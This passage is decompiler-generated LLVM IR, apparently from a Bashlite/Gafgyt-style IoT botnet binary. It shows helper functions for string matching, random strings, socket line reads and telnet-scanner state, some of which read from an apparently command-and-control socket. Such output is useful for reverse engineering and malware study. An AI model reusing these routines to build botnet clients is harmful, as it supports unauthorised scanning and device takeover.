dec_label_pc_8048cf9:                             ; preds = %entry, %dec_label_pc_8048b9e, %dec_label_pc_8048ced
  %v2_8048cff = phi i32 [ %v2_8048cff.pre, %dec_label_pc_8048ced ], [ %v0_8048b8c, %dec_label_pc_8048b9e ], [ %v0_8048b8c, %entry ]
  %storemerge = phi i32 [ %storemerge2, %dec_label_pc_8048ced ], [ -1, %dec_label_pc_8048b9e ], [ -1, %entry ]
  store i32 %v2_8048cff, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_8048c65, { 1, 0 }
  uselistorder i32 %v2_8048ba1, { 1, 0 }
  uselistorder i8* %v0_8048b95, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i8** @global_var_805e0a0.13, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048cf9, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048ced, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  br label %dec_label_pc_8048d40

dec_label_pc_8048d17:                             ; preds = %dec_label_pc_8048d48
  %v3_8048d2f = inttoptr i32 %v5_8048d4b to i32*
  %v4_8048d2f = call i32 @__libc_read(i32 %arg3, i32* %v3_8048d2f, i32 1)
  %v4_8048d37 = add nuw i32 %storemerge113, 1
  %v8_8048d3a = icmp eq i32 %v4_8048d2f, 0
  %v12_8048d3a = icmp eq i32 %v4_8048d2f, 1
  %v1_8048d3e = icmp eq i1 %v12_8048d3a, false
  br i1 %v1_8048d3e, label %dec_label_pc_8048d56, label %dec_label_pc_8048d40

dec_label_pc_8048d40:                             ; preds = %entry, %dec_label_pc_8048d17
  %v8_8048d3a14 = phi i1 [ false, %entry ], [ %v8_8048d3a, %dec_label_pc_8048d17 ]
  %storemerge113 = phi i32 [ 0, %entry ], [ %v4_8048d37, %dec_label_pc_8048d17 ]
  %v5_8048d46 = icmp slt i32 %storemerge113, %arg2
  br i1 %v5_8048d46, label %dec_label_pc_8048d48, label %dec_label_pc_8048d56

dec_label_pc_8048d48:                             ; preds = %dec_label_pc_8048d40
  %v5_8048d4b = add i32 %storemerge113, %arg1
  %v1_8048d4e = add i32 %v5_8048d4b, -1
  %v1_8048d4f = inttoptr i32 %v1_8048d4e to i8*
  %v2_8048d4f = load i8, i8* %v1_8048d4f, align 1
  %v10_8048d52 = icmp eq i8 %v2_8048d4f, 10
  %v1_8048d54 = icmp eq i1 %v10_8048d52, false
  br i1 %v1_8048d54, label %dec_label_pc_8048d17, label %dec_label_pc_8048d56

dec_label_pc_8048d56:                             ; preds = %dec_label_pc_8048d40, %dec_label_pc_8048d48, %dec_label_pc_8048d17
  %v8_8048d3a.lcssa = phi i1 [ %v8_8048d3a14, %dec_label_pc_8048d40 ], [ %v8_8048d3a14, %dec_label_pc_8048d48 ], [ %v8_8048d3a, %dec_label_pc_8048d17 ]
  br i1 %v8_8048d3a.lcssa, label %dec_label_pc_8048d6b, label %dec_label_pc_8048d5c

dec_label_pc_8048d5c:                             ; preds = %dec_label_pc_8048d56
  br label %dec_label_pc_8048d6b

dec_label_pc_8048d6b:                             ; preds = %dec_label_pc_8048d56, %dec_label_pc_8048d5c
  %storemerge = phi i32 [ %arg1, %dec_label_pc_8048d5c ], [ 0, %dec_label_pc_8048d56 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v5_8048d4b, { 1, 0 }
  uselistorder i32 %storemerge113, { 2, 0, 1 }
  uselistorder i1 %v8_8048d3a14, { 1, 0 }
  uselistorder i1 %v8_8048d3a, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048d6b, { 1, 0 }
  uselistorder label %dec_label_pc_8048d56, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048d40, { 1, 0 }
}

define i32 @parseHex(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8048d9f1 = ptrtoint i8* %arg1 to i32
  %v2_8048da22 = load i8, i8* %arg1, align 1
  %v4_8048da54 = icmp eq i8 %v2_8048da22, 0
  br i1 %v4_8048da54, label %dec_label_pc_8048daf, label %dec_label_pc_8048da9

dec_label_pc_8048d7f:                             ; preds = %dec_label_pc_8048da9
  %v2_8048d84 = mul i32 %stack_var_-8.010, 16
  %v2_8048d8a = load i8, i8* %stack_var_4.011, align 1
  %v3_8048d8a = zext i8 %v2_8048d8a to i32
  %v1_8048d90 = mul nuw nsw i32 %v3_8048d8a, 4
  %v2_8048d90 = add i32 %v1_8048d90, ptrtoint (i32* @global_var_8056320.17 to i32)
  %v3_8048d90 = inttoptr i32 %v2_8048d90 to i32*
  %v4_8048d90 = load i32, i32* %v3_8048d90, align 4
  %v2_8048d97 = or i32 %v4_8048d90, %v2_8048d84
  %v5_8048d9c = add i32 %v4_8048d9f12, 1
  %v22_8048d9c = inttoptr i32 %v5_8048d9c to i8*
  %v2_8048da2 = load i8, i8* %v22_8048d9c, align 1
  %v4_8048da5 = icmp eq i8 %v2_8048da2, 0
  br i1 %v4_8048da5, label %dec_label_pc_8048daf, label %dec_label_pc_8048da9

dec_label_pc_8048da9:                             ; preds = %entry, %dec_label_pc_8048d7f
  %v4_8048d9f12 = phi i32 [ %v5_8048d9c, %dec_label_pc_8048d7f ], [ %v4_8048d9f1, %entry ]
  %stack_var_4.011 = phi i8* [ %v22_8048d9c, %dec_label_pc_8048d7f ], [ %arg1, %entry ]
  %stack_var_-8.010 = phi i32 [ %v2_8048d97, %dec_label_pc_8048d7f ], [ 0, %entry ]
  %v5_8048da9 = icmp slt i32 %stack_var_-8.010, 0
  %v1_8048dad = icmp eq i1 %v5_8048da9, false
  br i1 %v1_8048dad, label %dec_label_pc_8048d7f, label %dec_label_pc_8048daf

dec_label_pc_8048daf:                             ; preds = %dec_label_pc_8048d7f, %dec_label_pc_8048da9, %entry
  %stack_var_-8.0.lcssa = phi i32 [ 0, %entry ], [ %v2_8048d97, %dec_label_pc_8048d7f ], [ %stack_var_-8.010, %dec_label_pc_8048da9 ]
  ret i32 %stack_var_-8.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-8.010, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8048daf, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048da9, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp12 = inttoptr i32 %arg2 to i8*
  %stack_var_-8 = alloca i32, align 4
  %v0_8048db7 = load i32, i32* @ebx, align 4
  store i32 %v0_8048db7, i32* %stack_var_-8, align 4
  %v4_8048dbb = ptrtoint i8* %arg1 to i32
  %v2_8048dbe = load i8, i8* %arg1, align 1
  %v12_8048dc7 = icmp eq i8 %v2_8048dbe, 42
  br i1 %v12_8048dc7, label %dec_label_pc_8048def, label %dec_label_pc_8048dcd

dec_label_pc_8048dcd:                             ; preds = %entry
  %v12_8048dcd = icmp eq i8 %v2_8048dbe, 63
  br i1 %v12_8048dcd, label %dec_label_pc_8048e42, label %dec_label_pc_8048dd3

dec_label_pc_8048dd3:                             ; preds = %dec_label_pc_8048dcd
  %v4_8048dd3 = icmp eq i8 %v2_8048dbe, 0
  br i1 %v4_8048dd3, label %dec_label_pc_8048dde, label %dec_label_pc_8048e7c

dec_label_pc_8048dde:                             ; preds = %dec_label_pc_8048dd3
  %v2_8048de1 = load i8, i8* %tmp12, align 1
  %v3_8048de1 = zext i8 %v2_8048de1 to i32
  br label %dec_label_pc_8048ed2

dec_label_pc_8048def:                             ; preds = %entry
  %v1_8048df2 = add i32 %v4_8048dbb, 1
  %v4_8048dfa = inttoptr i32 %v1_8048df2 to i8*
  %v5_8048dfd = call i32 @wildString(i8* %v4_8048dfa, i32 %arg2)
  %v1_8048e02 = icmp eq i32 %v5_8048dfd, 0
  br i1 %v1_8048e02, label %dec_label_pc_8048e30, label %dec_label_pc_8048e06

dec_label_pc_8048e06:                             ; preds = %dec_label_pc_8048def
  %v2_8048e09 = load i8, i8* %tmp12, align 1
  %v4_8048e0c = icmp eq i8 %v2_8048e09, 0
  br i1 %v4_8048e0c, label %dec_label_pc_8048e37, label %dec_label_pc_8048e10

dec_label_pc_8048e10:                             ; preds = %dec_label_pc_8048e06
  %v1_8048e13 = add i32 %arg2, 1
  %v5_8048e1e = call i32 @wildString(i8* nonnull %arg1, i32 %v1_8048e13)
  %v1_8048e23 = icmp eq i32 %v5_8048e1e, 0
  br i1 %v1_8048e23, label %dec_label_pc_8048e30, label %dec_label_pc_8048e37

dec_label_pc_8048e30:                             ; preds = %dec_label_pc_8048e10, %dec_label_pc_8048def
  br label %dec_label_pc_8048e37

dec_label_pc_8048e37:                             ; preds = %dec_label_pc_8048e06, %dec_label_pc_8048e10, %dec_label_pc_8048e30
  %storemerge5 = phi i32 [ 0, %dec_label_pc_8048e30 ], [ 1, %dec_label_pc_8048e10 ], [ 1, %dec_label_pc_8048e06 ]
  br label %dec_label_pc_8048ed2

dec_label_pc_8048e42:                             ; preds = %dec_label_pc_8048dcd
  %v2_8048e45 = load i8, i8* %tmp12, align 1
  %v4_8048e48 = icmp eq i8 %v2_8048e45, 0
  br i1 %v4_8048e48, label %dec_label_pc_8048e74, label %dec_label_pc_8048e4c

dec_label_pc_8048e4c:                             ; preds = %dec_label_pc_8048e42
  %v1_8048e4f = add i32 %arg2, 1
  %v1_8048e53 = add i32 %v4_8048dbb, 1
  %v4_8048e58 = inttoptr i32 %v1_8048e53 to i8*
  %v5_8048e5b = call i32 @wildString(i8* %v4_8048e58, i32 %v1_8048e4f)
  %v1_8048e60 = icmp ne i32 %v5_8048e5b, 0
  %. = zext i1 %v1_8048e60 to i32
  br label %dec_label_pc_8048e74

dec_label_pc_8048e74:                             ; preds = %dec_label_pc_8048e4c, %dec_label_pc_8048e42
  %storemerge4 = phi i32 [ 1, %dec_label_pc_8048e42 ], [ %., %dec_label_pc_8048e4c ]
  br label %dec_label_pc_8048ed2

dec_label_pc_8048e7c:                             ; preds = %dec_label_pc_8048dd3
  %v2_8048e7f = load i8, i8* %arg1, align 1
  %v3_8048e7f = zext i8 %v2_8048e7f to i32
  %v2_8048e88 = call i32 @__GI_toupper(i32 %v3_8048e7f)
  store i32 %v2_8048e88, i32* @ebx, align 4
  %v2_8048e92 = load i8, i8* %tmp12, align 1
  %v3_8048e92 = zext i8 %v2_8048e92 to i32
  %v2_8048e9b = call i32 @__GI_toupper(i32 %v3_8048e92)
  %v0_8048ea0 = load i32, i32* @ebx, align 4
  %v12_8048ea0 = icmp eq i32 %v0_8048ea0, %v2_8048e9b
  %v1_8048ea2 = icmp eq i1 %v12_8048ea0, false
  br i1 %v1_8048ea2, label %dec_label_pc_8048ecc, label %dec_label_pc_8048ea4

dec_label_pc_8048ea4:                             ; preds = %dec_label_pc_8048e7c
  %v1_8048ea7 = add i32 %arg2, 1
  %v1_8048eab = add i32 %v4_8048dbb, 1
  %v4_8048eb0 = inttoptr i32 %v1_8048eab to i8*
  %v5_8048eb3 = call i32 @wildString(i8* %v4_8048eb0, i32 %v1_8048ea7)
  %v1_8048eb8 = icmp ne i32 %v5_8048eb3, 0
  %.6 = zext i1 %v1_8048eb8 to i32
  br label %dec_label_pc_8048ecc

dec_label_pc_8048ecc:                             ; preds = %dec_label_pc_8048ea4, %dec_label_pc_8048e7c
  %storemerge = phi i32 [ 1, %dec_label_pc_8048e7c ], [ %.6, %dec_label_pc_8048ea4 ]
  br label %dec_label_pc_8048ed2

dec_label_pc_8048ed2:                             ; preds = %dec_label_pc_8048e74, %dec_label_pc_8048e37, %dec_label_pc_8048dde, %dec_label_pc_8048ecc
  %stack_var_-24.0 = phi i32 [ %storemerge5, %dec_label_pc_8048e37 ], [ %storemerge4, %dec_label_pc_8048e74 ], [ %v3_8048de1, %dec_label_pc_8048dde ], [ %storemerge, %dec_label_pc_8048ecc ]
  %v2_8048ed8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048ed8, i32* @ebx, align 4
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i8 %v2_8048dbe, { 2, 0, 1 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8048ed2, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_8048e37, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %v0_8048edb = load i32, i32* @ebp, align 4
  %v1_8048ee7 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_8048ee7, i32* %arg2, align 4
  %v10_8048ef8 = icmp eq i32 %v1_8048ee7, -1
  %. = zext i1 %v10_8048ef8 to i32
  store i32 %v0_8048edb, i32* @ebp, align 4
  ret i32 %.
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8048f354 = ptrtoint i8* %arg1 to i32
  %v2_8048f385 = load i8, i8* %arg1, align 1
  %v4_8048f3b7 = icmp eq i8 %v2_8048f385, 0
  %v1_8048f3d9 = icmp eq i1 %v4_8048f3b7, false
  br i1 %v1_8048f3d9, label %dec_label_pc_8048f1a, label %dec_label_pc_8048f3f

dec_label_pc_8048f1a:                             ; preds = %entry, %dec_label_pc_8048f1a
  %v4_8048f3511 = phi i32 [ %v5_8048f32, %dec_label_pc_8048f1a ], [ %v4_8048f354, %entry ]
  %stack_var_4.010 = phi i8* [ %v22_8048f32, %dec_label_pc_8048f1a ], [ %arg1, %entry ]
  %v2_8048f1d = load i8, i8* %stack_var_4.010, align 1
  %v3_8048f1d = zext i8 %v2_8048f1d to i32
  %v1_8048f26 = call i32 @__GI_toupper(i32 %v3_8048f1d)
  %v1_8048f30 = trunc i32 %v1_8048f26 to i8
  store i8 %v1_8048f30, i8* %stack_var_4.010, align 1
  %v5_8048f32 = add i32 %v4_8048f3511, 1
  %v22_8048f32 = inttoptr i32 %v5_8048f32 to i8*
  %v2_8048f38 = load i8, i8* %v22_8048f32, align 1
  %v4_8048f3b = icmp eq i8 %v2_8048f38, 0
  %v1_8048f3d = icmp eq i1 %v4_8048f3b, false
  br i1 %v1_8048f3d, label %dec_label_pc_8048f1a, label %dec_label_pc_8048f35.dec_label_pc_8048f3f_crit_edge

dec_label_pc_8048f35.dec_label_pc_8048f3f_crit_edge: ; preds = %dec_label_pc_8048f1a
  br label %dec_label_pc_8048f3f

dec_label_pc_8048f3f:                             ; preds = %dec_label_pc_8048f35.dec_label_pc_8048f3f_crit_edge, %entry
  %v3_8048f38.lcssa.in = phi i8 [ %v2_8048f38, %dec_label_pc_8048f35.dec_label_pc_8048f3f_crit_edge ], [ %v2_8048f385, %entry ]
  %v3_8048f38.lcssa = zext i8 %v3_8048f38.lcssa.in to i32
  ret i32 %v3_8048f38.lcssa

; uselistorder directives
  uselistorder i8* %v22_8048f32, { 1, 0 }
  uselistorder i32 %v5_8048f32, { 1, 0 }
  uselistorder i8* %stack_var_4.010, { 1, 0 }
  uselistorder label %dec_label_pc_8048f1a, { 1, 0 }
}

define i32 @makeRandomStr(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048f41 = load i32, i32* @ebp, align 4
  store i32 %v0_8048f41, i32* %stack_var_-4, align 4
  %v0_8048f44 = load i32, i32* @ebx, align 4
  store i32 %v0_8048f44, i32* %stack_var_-8, align 4
  %v5_8048f5d = ptrtoint i8* %arg1 to i32
  %v5_8048fa325 = icmp sgt i32 %arg2, 0
  br i1 %v5_8048fa325, label %dec_label_pc_8048f58, label %dec_label_pc_8048fa5

dec_label_pc_8048f58:                             ; preds = %entry, %dec_label_pc_8048f58
  %storemerge26 = phi i32 [ %v4_8048f9a, %dec_label_pc_8048f58 ], [ 0, %entry ]
  %v6_8048f5d = add i32 %storemerge26, %v5_8048f5d
  store i32 %v6_8048f5d, i32* @ebx, align 4
  %v1_8048f60 = call i32 @rand_cmwc(i32 %storemerge26)
  %v2_8048f75 = udiv i32 %v1_8048f60, 26
  %tmp = mul i32 %v2_8048f75, -10
  %v2_8048f8d = add i32 %v1_8048f60, %tmp
  %v14_8048f8d = trunc i32 %v2_8048f8d to i8
  %v2_8048f96 = add i8 %v14_8048f8d, 65
  %v2_8048f98 = load i32, i32* @ebx, align 4
  %v3_8048f98 = inttoptr i32 %v2_8048f98 to i8*
  store i8 %v2_8048f96, i8* %v3_8048f98, align 1
  %v4_8048f9a = add nuw nsw i32 %storemerge26, 1
  %exitcond = icmp eq i32 %v4_8048f9a, %arg2
  br i1 %exitcond, label %dec_label_pc_8048f9d.dec_label_pc_8048fa5_crit_edge, label %dec_label_pc_8048f58

dec_label_pc_8048f9d.dec_label_pc_8048fa5_crit_edge: ; preds = %dec_label_pc_8048f58
  %v2_8048fa8.pre = load i32, i32* %stack_var_-8, align 4
  %v2_8048fa9.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048fa5

dec_label_pc_8048fa5:                             ; preds = %dec_label_pc_8048f9d.dec_label_pc_8048fa5_crit_edge, %entry
  %v2_8048fa9 = phi i32 [ %v2_8048fa9.pre, %dec_label_pc_8048f9d.dec_label_pc_8048fa5_crit_edge ], [ %v0_8048f41, %entry ]
  %v2_8048fa8 = phi i32 [ %v2_8048fa8.pre, %dec_label_pc_8048f9d.dec_label_pc_8048fa5_crit_edge ], [ %v0_8048f44, %entry ]
  %storemerge.lcssa = phi i32 [ %arg2, %dec_label_pc_8048f9d.dec_label_pc_8048fa5_crit_edge ], [ 0, %entry ]
  store i32 %v2_8048fa8, i32* @ebx, align 4
  store i32 %v2_8048fa9, i32* @ebp, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_8048f9a, { 1, 0 }
  uselistorder i32 %storemerge26, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8048f58, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-177 = alloca i8, align 1
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8048fae = load i32, i32* @edi, align 4
  store i32 %v0_8048fae, i32* %stack_var_-8, align 4
  %v4_8048fb8 = ptrtoint i8* %arg2 to i32
  %v1_8048fc0 = and i32 %v4_8048fb8, -256
  %v5_8048fc2 = call i8* @_memset(i8* %arg2, i32 %v1_8048fc0, i32 %arg3)
  store i32 30, i32* %stack_var_-176, align 4
  %v2_8048fe2 = ptrtoint i32* %stack_var_-168 to i32
  %tmp31 = bitcast i32* %stack_var_-168 to i8*
  store i32 %v2_8048fe2, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8048fe9 = call i8* @_memset(i8* %tmp31, i32 0, i32 32)
  %v2_8048ff6 = udiv i32 %arg1, 32
  %v1_8048ffc = urem i32 %arg1, 32
  %v0_8048fff = load i32, i32* @ebp, align 4
  %v2_8048fff = mul nuw nsw i32 %v2_8048ff6, 4
  %v3_8048fff = add nsw i32 %v2_8048fff, -164
  %v4_8048fff = add i32 %v3_8048fff, %v0_8048fff
  %v5_8048fff = inttoptr i32 %v4_8048fff to i32*
  %v6_8048fff = load i32, i32* %v5_8048fff, align 4
  %v9_8048fff = shl i32 1, %v1_8048ffc
  %v12_8048fff = or i32 %v6_8048fff, %v9_8048fff
  store i32 %v12_8048fff, i32* %v5_8048fff, align 4
  %v1_804900a = add i32 %arg1, 1
  %v2_804900b = ptrtoint i32* %stack_var_-176 to i32
  %v6_8049034 = call i32 @__libc_select(i32 %v1_804900a, i32 %v2_8048fe2, i32 0, i32 %v2_8048fe2, i32 %v2_804900b)
  %tmp32 = icmp slt i32 %v6_8049034, 1
  %tmp33 = icmp eq i1 %tmp32, false
  br i1 %tmp33, label %dec_label_pc_80490eb, label %dec_label_pc_80490e1.preheader

dec_label_pc_80490e1.preheader:                   ; preds = %entry
  %v7_80490e545 = icmp sgt i32 %tmp10, 9
  br i1 %v7_80490e545, label %dec_label_pc_80490eb, label %dec_label_pc_804904b

dec_label_pc_804904b:                             ; preds = %dec_label_pc_80490e1.preheader, %dec_label_pc_80490de
  %stack_var_-36.046 = phi i32 [ %v4_80490de, %dec_label_pc_80490de ], [ %tmp10, %dec_label_pc_80490e1.preheader ]
  %v0_804904b = load i32, i32* @global_var_805a080.18, align 128
  %v3_804905b = call i32 @Rootsprintf(i32 %v0_804904b, i32 ptrtoint ([5 x i8]* @global_var_8056720.19 to i32))
  store i32 30, i32* %stack_var_-176, align 4
  store i32 %v2_8048fe2, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8049085 = call i8* @_memset(i8* %tmp31, i32 0, i32 32)
  %v0_804909b = load i32, i32* @ebp, align 4
  %v4_804909b = add i32 %v3_8048fff, %v0_804909b
  %v5_804909b = inttoptr i32 %v4_804909b to i32*
  %v6_804909b = load i32, i32* %v5_804909b, align 4
  %v12_804909b = or i32 %v6_804909b, %v9_8048fff
  store i32 %v12_804909b, i32* %v5_804909b, align 4
  %v6_80490d0 = call i32 @__libc_select(i32 %v1_804900a, i32 %v2_8048fe2, i32 0, i32 %v2_8048fe2, i32 %v2_804900b)
  %tmp34 = icmp slt i32 %v6_80490d0, 1
  %tmp35 = icmp eq i1 %tmp34, false
  br i1 %tmp35, label %dec_label_pc_80490eb, label %dec_label_pc_80490de

dec_label_pc_80490de:                             ; preds = %dec_label_pc_804904b
  %v4_80490de = add nsw i32 %stack_var_-36.046, 1
  %v7_80490e5 = icmp sgt i32 %stack_var_-36.046, 8
  br i1 %v7_80490e5, label %dec_label_pc_80490eb, label %dec_label_pc_804904b

dec_label_pc_80490eb:                             ; preds = %dec_label_pc_80490e1.preheader, %dec_label_pc_804904b, %dec_label_pc_80490de, %entry
  %v2_804910f = ptrtoint i8* %stack_var_-177 to i32
  br label %dec_label_pc_8049155

dec_label_pc_80490fa:                             ; preds = %dec_label_pc_8049155
  %v0_80490fa = load i32, i32* @global_var_805a080.18, align 128
  %v5_804911c = call i32 @__libc_recv(i32 %v0_80490fa, i32 %v2_804910f, i32 1, i32 0)
  %v9_8049121 = icmp eq i32 %v5_804911c, 1
  br i1 %v9_8049121, label %dec_label_pc_8049138, label %dec_label_pc_8049126

dec_label_pc_8049126:                             ; preds = %dec_label_pc_80490fa
  store i8 0, i8* %stack_var_-32.0, align 1
  br label %dec_label_pc_8049172

dec_label_pc_8049138:                             ; preds = %dec_label_pc_80490fa
  %v3_8049138 = load i8, i8* %stack_var_-177, align 1
  %v4_804913f = ptrtoint i8* %stack_var_-32.0 to i32
  store i8 %v3_8049138, i8* %stack_var_-32.0, align 1
  %v5_8049144 = add i32 %v4_804913f, 1
  %v22_8049144 = inttoptr i32 %v5_8049144 to i8*
  %v3_8049147 = load i8, i8* %stack_var_-177, align 1
  %v10_804914e = icmp eq i8 %v3_8049147, 10
  br i1 %v10_804914e, label %dec_label_pc_8049163, label %dec_label_pc_8049152

dec_label_pc_8049152:                             ; preds = %dec_label_pc_8049138
  %v4_8049152 = add i32 %stack_var_-28.0, 1
  br label %dec_label_pc_8049155

dec_label_pc_8049155:                             ; preds = %dec_label_pc_80490eb, %dec_label_pc_8049152
  %stack_var_-32.0 = phi i8* [ %arg2, %dec_label_pc_80490eb ], [ %v22_8049144, %dec_label_pc_8049152 ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_80490eb ], [ %v4_8049152, %dec_label_pc_8049152 ]
  %stack_var_12.0 = phi i32 [ %arg3, %dec_label_pc_80490eb ], [ %v4_8049155, %dec_label_pc_8049152 ]
  %v4_8049155 = add i32 %stack_var_12.0, -1
  %v9_8049155 = sub i32 0, %stack_var_12.0
  %v10_8049155 = and i32 %stack_var_12.0, %v9_8049155
  %v11_8049155 = icmp slt i32 %v10_8049155, 0
  %v12_8049155 = icmp eq i32 %v4_8049155, 0
  %v13_8049155 = icmp slt i32 %v4_8049155, 0
  %v3_8049159 = icmp eq i1 %v13_8049155, %v11_8049155
  %v4_8049159 = icmp eq i1 %v12_8049155, false
  %v5_8049159 = and i1 %v4_8049159, %v3_8049159
  %v4_804915f = icmp eq i1 %v5_8049159, false
  %v1_8049161 = icmp eq i1 %v4_804915f, false
  br i1 %v1_8049161, label %dec_label_pc_80490fa, label %dec_label_pc_8049163

dec_label_pc_8049163:                             ; preds = %dec_label_pc_8049138, %dec_label_pc_8049155
  %stack_var_-32.1 = phi i8* [ %v22_8049144, %dec_label_pc_8049138 ], [ %stack_var_-32.0, %dec_label_pc_8049155 ]
  store i8 0, i8* %stack_var_-32.1, align 1
  br label %dec_label_pc_8049172

dec_label_pc_8049172:                             ; preds = %dec_label_pc_8049126, %dec_label_pc_8049163
  %storemerge = phi i32 [ -1, %dec_label_pc_8049126 ], [ %stack_var_-28.0, %dec_label_pc_8049163 ]
  %v2_804917e = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804917e, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8049155, { 2, 1, 0 }
  uselistorder i32 %stack_var_12.0, { 1, 0, 2 }
  uselistorder i8* %stack_var_-32.0, { 1, 0, 2, 3 }
  uselistorder i8* %v22_8049144, { 1, 0 }
  uselistorder i32 %v2_8048fe2, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-176, { 0, 2, 1 }
  uselistorder i8* %stack_var_-177, { 2, 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049172, { 1, 0 }
  uselistorder label %dec_label_pc_8049163, { 1, 0 }
  uselistorder label %dec_label_pc_8049155, { 1, 0 }
  uselistorder label %dec_label_pc_80490eb, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804904b, { 1, 0 }
}

define i32 @get_telstate_host() local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v0_8049181 = load i32, i32* @ebp, align 4
  %v1_804918a = add i32 %tmp1, 4
  %v2_804918a = inttoptr i32 %v1_804918a to i32*
  %v3_804918a = load i32, i32* %v2_804918a, align 4
  %v1_8049196 = call i32 @__GI_inet_ntoa(i32 %v3_804918a)
  store i32 %v0_8049181, i32* @ebp, align 4
  ret i32 %v1_8049196
}

define i32 @read_until_response(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_80491a0 = load i32, i32* @edi, align 4
  store i32 %v0_80491a0, i32* %stack_var_-8, align 4
  %v1_80491aa = inttoptr i32 %tmp8 to i8*
  store i32 %tmp8, i32* @edi, align 4
  %v1_80491af = and i32 %tmp8, -256
  %v5_80491b1 = call i8* @_memset(i8* %v1_80491aa, i32 %v1_80491af, i32 %tmp9)
  %v4_80491ce = call i32 @read_with_timeout(i32 %arg1, i32 %tmp5, i32 %tmp8, i32 %tmp9)
  %v2_80491e3 = inttoptr i32 %tmp1 to i32*
  %v3_80491e3 = call i32 @contains_string(i32 %tmp8, i32* %v2_80491e3)
  %v1_80491e8 = icmp ne i32 %v3_80491e3, 0
  %storemerge = zext i1 %v1_80491e8 to i32
  %v2_8049202 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8049202, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %tmp9, { 1, 0 }
  uselistorder i32 %tmp8, { 4, 3, 0, 2, 1 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  store i32 0, i32* %stack_var_-152, align 4
  %v2_804922c = ptrtoint i32* %stack_var_-144 to i32
  %tmp18 = bitcast i32* %stack_var_-144 to i8*
  store i1 false, i1* @df, align 1
  %v5_8049233 = call i8* @_memset(i8* %tmp18, i32 0, i32 32)
  %v2_8049240 = udiv i32 %arg1, 32
  %v1_8049246 = urem i32 %arg1, 32
  %v0_8049249 = load i32, i32* @ebp, align 4
  %v2_8049249 = mul nuw nsw i32 %v2_8049240, 4
  %v3_8049249 = add nsw i32 %v2_8049249, -140
  %v4_8049249 = add i32 %v3_8049249, %v0_8049249
  %v5_8049249 = inttoptr i32 %v4_8049249 to i32*
  %v6_8049249 = load i32, i32* %v5_8049249, align 4
  %v9_8049249 = shl i32 1, %v1_8049246
  %v12_8049249 = or i32 %v6_8049249, %v9_8049249
  store i32 %v12_8049249, i32* %v5_8049249, align 4
  %v1_8049254 = add i32 %arg1, 1
  %v4_804925b = ptrtoint i32* %stack_var_-152 to i32
  %v5_804927c = call i32 @__libc_select(i32 %v1_8049254, i32 %v2_804922c, i32 0, i32 0, i32 %v4_804925b)
  %tmp19 = icmp slt i32 %v5_804927c, 1
  %tmp20 = icmp eq i1 %tmp19, false
  br i1 %tmp20, label %dec_label_pc_8049291, label %dec_label_pc_80492b8

dec_label_pc_8049291:                             ; preds = %entry
  %v4_80492ad = call i32 @__libc_recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0)
  br label %dec_label_pc_80492b8

dec_label_pc_80492b8:                             ; preds = %entry, %dec_label_pc_8049291
  %storemerge = phi i32 [ %v4_80492ad, %dec_label_pc_8049291 ], [ 0, %entry ]
